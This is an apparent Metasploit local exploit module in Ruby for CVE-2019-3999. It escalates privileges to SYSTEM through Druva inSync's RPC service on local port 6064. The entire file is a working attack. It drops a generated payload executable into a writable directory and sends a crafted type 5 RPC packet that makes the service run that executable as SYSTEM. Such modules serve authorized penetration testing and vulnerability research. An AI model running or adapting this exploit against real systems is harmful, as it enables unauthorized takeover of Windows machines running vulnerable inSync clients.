# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Post::File
  include Post::Windows::Priv
  include Post::Windows::Services
  include Exploit::EXE
  include Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        {
          &#039;Name&#039; => &#039;Druva inSync inSyncCPHwnet64.exe RPC Type 5 Privilege Escalation&#039;,
          &#039;Description&#039; => %q{
            Druva inSync client for Windows exposes a network service on TCP port
            6064 on the local network interface. inSync versions 6.5.2 and prior
            do not validate user-supplied program paths in RPC type 5 messages,
            allowing execution of arbitrary commands as SYSTEM.
            This module has been tested successfully on inSync version
            6.5.2r99097 on Windows 7 SP1 (x64).
          },
          &#039;License&#039; => MSF_LICENSE,
          &#039;Author&#039; =>
          [
            &#039;Chris Lyne&#039;, # Discovery and Python exploit (@lynerc)
            &#039;bcoles&#039; # Metasploit
          ],
          &#039;References&#039; =>
          [
            [&#039;CVE&#039;, &#039;2019-3999&#039;],
            [&#039;EDB&#039;, &#039;48400&#039;],
            [&#039;PACKETSTORM&#039;, &#039;157493&#039;],
            [&#039;URL&#039;, &#039;https://www.tenable.com/security/research/tra-2020-12&#039;],
            [&#039;URL&#039;, &#039;https://github.com/tenable/poc/blob/master/druva/inSync/druva_win_cphwnet64.py&#039;],
          ],
          &#039;Platform&#039; =>
          [
            &#039;win&#039;
          ],
          &#039;SessionTypes&#039; =>
          [
          ],
          &#039;Targets&#039; =>
          [
            [
              &#039;Automatic&#039;,
              {}
            ]
          ],
          &#039;DisclosureDate&#039; => &#039;2020-02-25&#039;,
          &#039;DefaultOptions&#039; =>
          {
          },
          &#039;Notes&#039; =>
          {
            &#039;Reliability&#039; =>
            [
              REPEATABLE_SESSION
            ],
            &#039;Stability&#039; =>
            [
              CRASH_SAFE
            ]
          },
          &#039;DefaultTarget&#039; => 0
        }
      )
    )
    register_advanced_options([
      OptString.new(
        &#039;WritableDir&#039;,
        [
          false,
          &#039;A directory where we can write files (%TEMP% by default)&#039;,
          nil
        ]
      ),
    ])
  end

  def base_dir
    datastore[&#039;WritableDir&#039;].blank? ? session.sys.config.getenv(&#039;TEMP&#039;) : datastore[&#039;WritableDir&#039;].to_s
  end

  def service_exists?(service)
    srv_info = service_info(service)

    if srv_info.nil?
      vprint_warning(&#039;Unable to enumerate Windows services&#039;)
      return false
    end

    if srv_info && srv_info[:display].empty?
      return false
    end

    true
  end

  def execute_command(host, port, command)
    header = &#039;inSync PHC RPCW[v0002]&#039;
    rpc_type = [5].pack(&#039;V&#039;)
    cmd = command.force_encoding(&#039;UTF-8&#039;).unpack(&#039;U*&#039;).pack(&#039;v*&#039;)

    pkt = header
    pkt << rpc_type
    pkt << [cmd.length].pack(&#039;V&#039;)
    pkt << cmd

    result = session.railgun.ws2_32.WSASocketA(&#039;AF_INET&#039;, &#039;SOCK_STREAM&#039;, &#039;IPPROTO_TCP&#039;, nil, nil, 0)

    unless result[&#039;GetLastError&#039;] == 0
      fail_with(Failure::Unknown, "Could not create socket: #{result[&#039;ErrorMessage&#039;]}")
    end

    socket = result[&#039;return&#039;]

    sock_addr = [AF_INET].pack(&#039;v&#039;)
    sock_addr << [port].pack(&#039;n&#039;)
    sock_addr << Rex::Socket.addr_aton(host)
    sock_addr << "\x00" * 8

    print_status("Connecting to #{host}:#{port} ...")

    result = client.railgun.ws2_32.connect(socket, sock_addr, sock_addr.length)

    unless result[&#039;GetLastError&#039;] == 0
      fail_with(Failure::Unreachable, "Could not connect to #{host}:#{port} : #{result[&#039;ErrorMessage&#039;]}")
    end

    print_status("Sending packet (#{pkt.length} bytes) to #{host}:#{port} ...")
    vprint_status("Sending: #{pkt.inspect}")

    result = session.railgun.ws2_32.sendto(socket, pkt, pkt.length, 0, sock_addr, sock_addr.length)

    unless result[&#039;GetLastError&#039;] == 0
      fail_with(Failure::NotVulnerable, "Could not send data to port: #{result[&#039;ErrorMessage&#039;]}")
    end

    session.railgun.ws2_32.closesocket(socket)
  end

  def check
    service = &#039;inSyncCPHService&#039;

    unless service_exists?(service)
      return CheckCode::Safe("Service &#039;#{service}&#039; does not exist")
    end

    CheckCode::Detected("Service &#039;#{service}&#039; exists")
  end

  def exploit
    unless check == CheckCode::Detected
      fail_with(Failure::NotVulnerable, &#039;Target is not vulnerable&#039;)
    end

    if is_system?
      fail_with(Failure::BadConfig, &#039;Session already has SYSTEM privileges&#039;)
    end

    payload_path = "#{base_dir}\\#{Rex::Text.rand_text_alphanumeric(8..10)}.exe"
    payload_exe = generate_payload_exe
    vprint_status("Writing payload (#{payload.encoded.length} bytes) to #{payload_path} ...")
    write_file(payload_path, payload_exe)
    register_file_for_cleanup(payload_path)

    execute_command(&#039;127.0.0.1&#039;, 6064, payload_path)
  end
end

